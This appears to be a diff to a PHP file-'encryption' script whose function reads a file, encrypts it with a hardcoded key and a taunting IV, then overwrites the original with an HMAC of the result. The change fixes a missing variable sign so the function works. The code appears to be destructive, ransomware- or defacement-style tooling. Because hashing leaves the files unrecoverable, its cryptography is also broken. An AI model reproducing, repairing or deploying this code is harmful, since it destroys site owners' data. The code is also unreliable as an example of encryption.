@@ -3,7 +3,7 @@ $encryptionKey = "SatuDuaSembilanKasiann"; // Change this to your desired encryp
 // Function to encrypt a file
 function encryptFile($fileName, $encryptionKey) {
     $fileContent = file_get_contents($fileName);
-    $encryptedContent = hash_hmac('sha256', openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3'), encryptionKey, 0);
+    $encryptedContent = hash_hmac('sha256', openssl_encrypt($fileContent, 'AES-256-CBC', $encryptionKey, 0, 'FuckY0URS1T3'), $encryptionKey, 0);
     file_put_contents($fileName, $encryptedContent);
 }
 
